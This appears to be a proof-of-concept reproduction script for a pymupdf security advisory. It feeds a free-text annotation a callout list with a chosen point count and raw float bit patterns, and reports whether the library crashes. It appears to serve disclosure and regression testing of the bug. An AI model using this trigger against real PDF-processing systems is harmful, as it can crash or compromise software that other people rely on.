"""Local replay of GHSA-4gw9-9rgm-rwfx / CVE-2026-120752.

Usage: python3 repro.py COUNT [BITS_SPEC]
BITS_SPEC is either one IEEE-754 binary32 hex pattern (both coordinates of
every point) or a comma-separated list of XHEX:YHEX per point, cycled.
"""
import struct
import sys

import pymupdf


def as_float(bits_hex):
    return struct.unpack("<f", int(bits_hex, 16).to_bytes(4, "little"))[0]


def main():
    count = int(sys.argv[1])
    spec = sys.argv[2] if len(sys.argv) > 2 else "41200000"
    pairs = []
    for token in spec.split(","):
        if ":" in token:
            x, y = token.split(":")
        else:
            x = y = token
        pairs.append((as_float(x), as_float(y)))
    print(f"pymupdf={pymupdf.__doc__.splitlines()[0]} version={pymupdf.VersionBind}", flush=True)
    print(f"count={count} spec={spec}", flush=True)
    with pymupdf.open() as document:
        page = document.new_page()
        rect = pymupdf.Rect(50, 50, 200, 150)
        callout = [pairs[i % len(pairs)] for i in range(count)]
        annot = page.add_freetext_annot(rect, "test", callout=callout)
        print(f"annot={annot}", flush=True)
    print("NO_CRASH", flush=True)


if __name__ == "__main__":
    main()
